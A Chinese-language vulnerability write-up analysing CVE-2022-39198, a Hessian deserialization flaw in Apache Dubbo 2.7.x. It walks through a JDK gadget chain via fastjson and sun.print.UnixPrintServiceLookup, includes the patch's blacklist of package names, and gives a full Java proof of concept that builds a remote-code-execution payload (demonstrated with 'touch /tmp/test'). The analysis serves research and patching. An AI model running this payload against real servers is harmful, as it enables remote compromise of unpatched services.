#### CVE-2022-39198
##### 影响
2.7.x 
主要的更改是在`resources/DENY_CLASS`文件中
这个文件中，是这个项目维护的一个黑名单
从这次的修复中，多新增了好几个黑名单包名
> org.apache.commons.codec.
>
> org.aspectj.
>
> org.dom4j
>
> org.junit.
>
> org.mockito.
>
> org.thymeleaf.
>
> ognl.
>
> sun.print.
有很多，但是在其中只是存在有一个存在于JDK中的包名，即为`sun.print.`，这里仅是主要探讨有关于JDK中的利用链进行学习
> 对于其他的包名的的利用链，之后我将会通过自动化工具的方式进行挖掘探索
###### 漏洞回顾
要想要知道能够利用的恶意类到底是哪一个，我们需要明白hessian需要触发什么才能导致漏洞的利用
如果曾经更进过hessian以前的其他链子，你会发现，大多数的链子都是通过使用`HashMap / HashSet /
HashTable`等类来触发`equals / compareTo`等等方法来进行接下来的调用
而其中，marshal项目中存在有多个通过调用`XString#equals`方法的方式
进而调用到其他类的`toString`方法进行接下来 的调用
###### 现洞分析
在`CVE-2021-25641`这个CVE中存在的一条利用链是通过fastjson库的`JSONObject#toString`方法来进行反序列化操作，而在起反序列化的过程中将会调用反序列化类的任意getter方法，当时是直接通过触发了`TemplatesImpl#getOutputProperties`方法来进行利用的
而我们这里，也朝着这样的思路走，我们需要在`sun.print.`包下，找到一个类的`getter`方法能够进行漏洞的触发，那个就是我们想要的漏洞点
有关于这个类的利用，之前在跳跳糖中就存在
在上面这篇文章中有所提及
我们跟进一下这种利用方式
我们这里选用的环境是单独的一个`dubbo`依赖的环境(2.7.16版本)
沿用以前的思路，通过dubbo库依赖的fastjson库，进行任意getter方法的调用，进行调用上图中的`getDefaultPrintService`方法进行利用
首先我贴一下到`XString#equals`方法调用`JSONObject#toString`方法的调用栈
    toString:1071, JSON (com.alibaba.fastjson)
    equals:392, XString (com.sun.org.apache.xpath.internal.objects)
    equals:495, AbstractMap (java.util)
    putVal:635, HashMap (java.util)
    put:612, HashMap (java.util)
    doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)
    readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
    readObject:2733, Hessian2Input (com.alibaba.com.caucho.hessian.io)
    readObject:2308, Hessian2Input (com.alibaba.com.caucho.hessian.io)
之后来看看`JSONObject#toString`这条链子
这图是`XString#equals`方法中的代码，其中我们是通过HashMap反序列化的方法，进行元素之间的`equals`方法的调用，这里的`obj2`参数，只有是一个`JSONObject`对象，才会调用其`toString`方法
因为`JSONObject`类中没有toString方法，所以只能够调用其父类`JSON`类的`toString`方法进行调用
在这个`toString`方法中，调用了相同类的`toJSONString`方法
在这里，将会对我们的`JSONObject`对象进行反序列化操作
这部分的调用栈为
    write:-1, ASMSerializer_1_UnixPrintServiceLookup (com.alibaba.fastjson.serializer)
    write:271, MapSerializer (com.alibaba.fastjson.serializer)
    write:44, MapSerializer (com.alibaba.fastjson.serializer)
    write:312, JSONSerializer (com.alibaba.fastjson.serializer)
    toJSONString:1077, JSON (com.alibaba.fastjson)
我们前面通过fastjson反序列化的学习，也知道在其反序列化的过程中，将会导致任意getter方法的调用，所以自然能够调用到我们想要的`UnixPrintServiceLookup#getDefaultPrintService`方法
在这个方法中，主要是获取默认的打印服务相同的操作
首先在其中的一个if语句中
    if (CUPSPrinter.isCupsRunning())
我们如果想要利用，需要保证不会满足这个条件
并且操作系统不能够使MAC OS和SUN OS
如果能够满足我们上面的条件，我们将会进一步调用到`getDefaultPrinterNameBSD`方法中
这里，将会将`lpcFirstCom`属性中的值传入`exeCmd`方法中进行调用
而在该方法中，将会将命令拼接在`/bin/sh / /usr/bin/sh`这两个环境进行执行
之后会通过调用run方法来执行命令
因为在run方法中是存在有`Runtime.getRuntime().exec()`方法进行执行的，所以能够RCE
##### POC
    public class Test {
        public static void setFieldValue(Object obj, String filedName, Object value) throws NoSuchFieldException, IllegalAccessException {
            Field declaredField = obj.getClass().getDeclaredField(filedName);
            declaredField.setAccessible(true);
            declaredField.set(obj, value);
        }
        public static void main(String[] args) {
            try {
                //需要执行的命令
                String cmd = "touch /tmp/test";
                Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
                theUnsafe.setAccessible(true);
                Unsafe unsafe = (Unsafe) theUnsafe.get(null);
                Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);
                //绕过getDefaultPrinterNameBSD中的限制
                //设置属性
                setFieldValue(unixPrintServiceLookup, "cmdIndex", 0);
                setFieldValue(unixPrintServiceLookup, "osname", "xx");
                setFieldValue(unixPrintServiceLookup, "lpcFirstCom", new String[]{cmd, cmd, cmd});
                //封装一个JSONObject对象调用getter方法
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("xx", unixPrintServiceLookup);
                //使用XString类调用toString方法
                XString xString = new XString("xx");
                HashMap map1 = new HashMap();
                HashMap map2 = new HashMap();
                map1.put("yy",jsonObject);
                map1.put("zZ",xString);
                map2.put("yy",xString);
                map2.put("zZ",jsonObject);
                HashMap s = new HashMap();
                setFieldValue(s, "size", 2);
                Class nodeC;
                try {
                    nodeC = Class.forName("java.util.HashMap$Node");
                }
                catch ( ClassNotFoundException e ) {
                    nodeC = Class.forName("java.util.HashMap$Entry");
                }
                Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
                nodeCons.setAccessible(true);
                Object tbl = Array.newInstance(nodeC, 2);
                Array.set(tbl, 0, nodeCons.newInstance(0, map1, map1, null));
                Array.set(tbl, 1, nodeCons.newInstance(0, map2, map2, null));
                setFieldValue(s, "table", tbl);
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                Hessian2Output hessianOutput = new Hessian2Output(byteArrayOutputStream);
                hessianOutput.setSerializerFactory(new SerializerFactory());
                hessianOutput.getSerializerFactory().setAllowNonSerializable(true);
                hessianOutput.writeObject(s);
                hessianOutput.flushBuffer();
                System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
            }catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
##### 利用
我这里使用的是自己使用docker搭建的一个带有hessian反序列化环境且仅依赖dubbo库的环境
我将上面的POC得到的序列化数据编码后的base64字符串进行发送
在docker环境中，成功创建了`/tmp/test`这个空文件
##### 总结
这里不仅可以通过从`getDefaultPrintService`这个getter方法中进行漏洞的触发
同样也能够在其他的getter方法中进行漏洞的触发，因为毕竟fastjson的反序列化过程调用的所有的getter方法，比如说是也可以从`getPrintServices`方法中开始进行利用
当然，还有其他的getter方法
这里只是提及了这个CVE的JDK中的利用链，其他的利用链需要依赖其他的库，后面将会进行挖掘依赖中的getter利用
##### 参考